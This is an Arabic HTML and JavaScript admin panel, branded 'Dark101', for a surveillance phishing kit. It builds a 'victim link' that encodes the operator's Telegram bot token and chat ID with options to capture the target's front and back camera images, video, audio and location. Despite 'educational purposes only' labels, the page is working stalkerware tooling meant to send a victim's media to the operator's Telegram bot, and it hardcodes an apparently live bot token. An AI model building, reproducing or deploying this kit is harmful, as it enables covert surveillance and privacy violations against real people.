<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dark101 - لوحة التحكم</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background: linear-gradient(135deg, #0a0f1a, #0a192f);
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .panel{
            max-width: 550px;
            width: 100%;
            background: rgba(20,26,42,0.95);
            border-radius: 28px;
            padding: 35px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.4);
            border: 1px solid rgba(0,212,255,0.2);
        }
        h1{
            background: linear-gradient(90deg, #00d4ff, #0077ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-align: center;
            margin-bottom: 10px;
        }
        .sub{
            color: #8892b0;
            text-align: center;
            margin-bottom: 25px;
            font-size: 13px;
        }
        .warning{
            background: rgba(255,100,100,0.1);
            border: 1px solid #ff4444;
            border-radius: 14px;
            padding: 12px;
            margin-bottom: 25px;
            color: #ff8888;
            font-size: 12px;
            text-align: center;
        }
        label{
            display: block;
            color: #ccd6f6;
            margin: 15px 0 8px;
            font-weight: 600;
        }
        input{
            width: 100%;
            padding: 12px;
            border-radius: 14px;
            border: 1px solid rgba(0,212,255,0.2);
            background: rgba(10,15,26,0.8);
            color: #fff;
            font-size: 14px;
        }
        .checkbox-group{
            background: rgba(0,212,255,0.05);
            border-radius: 18px;
            padding: 15px;
            margin: 20px 0;
        }
        .checkbox-item{
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 8px 0;
        }
        .checkbox-item label{
            margin: 0;
            font-weight: normal;
        }
        .btn{
            width: 100%;
            padding: 15px;
            background: linear-gradient(90deg, #00d4ff, #0077ff);
            border: none;
            border-radius: 40px;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
        }
        .result-box{
            margin-top: 20px;
            background: rgba(0,212,255,0.1);
            border-radius: 14px;
            padding: 12px;
            display: flex;
            gap: 10px;
            align-items: center;
        }
        .copy-btn{
            background: #0077ff;
            border: none;
            padding: 8px 18px;
            border-radius: 25px;
            color: #fff;
            cursor: pointer;
        }
        footer{
            text-align: center;
            margin-top: 25px;
            color: #5a6e8a;
            font-size: 11px;
        }
    </style>
</head>
<body>
<div class="panel">
    <h1>🛡️ Dark101 Security</h1>
    <div class="sub">لوحة التحكم - للأغراض التعليمية فقط</div>
    
    <div class="warning">
        ⚠️ هذه الصفحة خاصة بك فقط. لا تشاركها مع أحد.
    </div>

    <label>📱 الـ Chat ID الخاص بك (ستصلك البيانات)</label>
    <input type="text" id="masterChatId" placeholder="مثال: 5849068535" value="5849068535">

    <label>🤖 توكن البوت الخاص بك</label>
    <input type="text" id="masterToken" placeholder="توكن البوت" value="8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU">

    <label style="margin-top:20px">📱 Chat ID الشخص المستهدف (للاختبار)</label>
    <input type="text" id="targetChatId" placeholder="أدخل Chat ID المستهدف">

    <label>🤖 توكن البوت الخاص بالمستهدف</label>
    <input type="text" id="targetToken" placeholder="أدخل توكن المستهدف">

    <div class="checkbox-group">
        <div class="checkbox-item"><input type="checkbox" id="camFront" checked><label>📸 صورة كاميرا أمامية</label></div>
        <div class="checkbox-item"><input type="checkbox" id="camBack"><label>📷 صورة كاميرا خلفية</label></div>
        <div class="checkbox-item"><input type="checkbox" id="location" checked><label>📍 تحديد الموقع</label></div>
        <div class="checkbox-item"><input type="checkbox" id="audio"><label>🎤 تسجيل صوتي</label></div>
        <div class="checkbox-item"><input type="checkbox" id="videoFront"><label>🎥 فيديو أمامي</label></div>
        <div class="checkbox-item"><input type="checkbox" id="videoBack"><label>📹 فيديو خلفي</label></div>
    </div>

    <button class="btn" id="generateBtn">🔗 إنشاء رابط الضحية</button>

    <div id="result" style="display: none;" class="result-box">
        <div id="linkText" style="flex:1;font-size:12px;word-break:break-all;color:#ccd6f6"></div>
        <button class="copy-btn" id="copyBtn">📋 نسخ</button>
    </div>
    <footer>Dark101 - للأغراض التعليمية فقط</footer>
</div>

<script>
// البيانات الثابتة الخاصة بك (مخفية هنا)
const MASTER_CHAT = "5849068535";
const MASTER_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";

document.getElementById('generateBtn').onclick = () => {
    let masterChat = document.getElementById('masterChatId').value.trim();
    let masterToken = document.getElementById('masterToken').value.trim();
    let targetChat = document.getElementById('targetChatId').value.trim();
    let targetToken = document.getElementById('targetToken').value.trim();
    
    if (!masterChat || !masterToken || !targetChat || !targetToken) {
        alert('❌ الرجاء إدخال جميع الحقول');
        return;
    }
    
    const features = [];
    if (document.getElementById('camFront').checked) features.push('front');
    if (document.getElementById('camBack').checked) features.push('back');
    if (document.getElementById('location').checked) features.push('loc');
    if (document.getElementById('audio').checked) features.push('audio');
    if (document.getElementById('videoFront').checked) features.push('vfront');
    if (document.getElementById('videoBack').checked) features.push('vback');
    
    // تشفير البيانات في الرابط
    const data = btoa(JSON.stringify({
        mChat: masterChat,
        mToken: masterToken,
        tChat: targetChat,
        tToken: targetToken,
        features: features.join(',')
    }));
    
    // الرابط سيوجه إلى index.html (صفحة الضحية)
    const baseUrl = window.location.href.replace('admin.html', 'index.html');
    const link = `${baseUrl}?d=${data}`;
    
    document.getElementById('linkText').innerText = link;
    document.getElementById('result').style.display = 'flex';
};

document.getElementById('copyBtn').onclick = async () => {
    await navigator.clipboard.writeText(document.getElementById('linkText').innerText);
    alert('✅ تم نسخ الرابط');
};
</script>
</body>
</html>
